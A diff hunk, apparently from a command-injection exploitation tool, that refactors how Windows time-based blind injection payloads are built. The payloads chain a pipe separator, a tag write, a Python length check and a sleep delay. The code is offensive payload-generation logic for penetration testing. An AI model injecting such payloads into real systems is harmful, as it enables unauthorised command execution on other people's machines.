@@ -94,16 +94,14 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator == "|" or separator == "||" :
-      pipe = "|"
-      payload = (pipe +
-                settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do if %i==" + str(j) + settings.SINGLE_WHITESPACE +
-                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
-                )
+    python_payload = '{} -c "with open(r\'{}\') as file: print(len(file.read().strip()))"'.format(settings.WIN_PYTHON_INTERPRETER, OUTPUT_TEXTFILE)
+    if separator in ("|", "||"):
+      payload = (
+        '| {}{} "{}" | '.format(settings.WIN_FILE_WRITE_OPERATOR, OUTPUT_TEXTFILE, TAG) +
+        'for /f "tokens=*" %i in (\'cmd /c {}\') do '.format(python_payload) +
+        'if %i=={} cmd /c {} '.format(j, settings.WIN_PYTHON_INTERPRETER) +
+        '-c "import time; time.sleep({})"'.format(2 * timesec + 1)
+      )
     elif separator == _urllib.parse.quote("&&") :
       #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
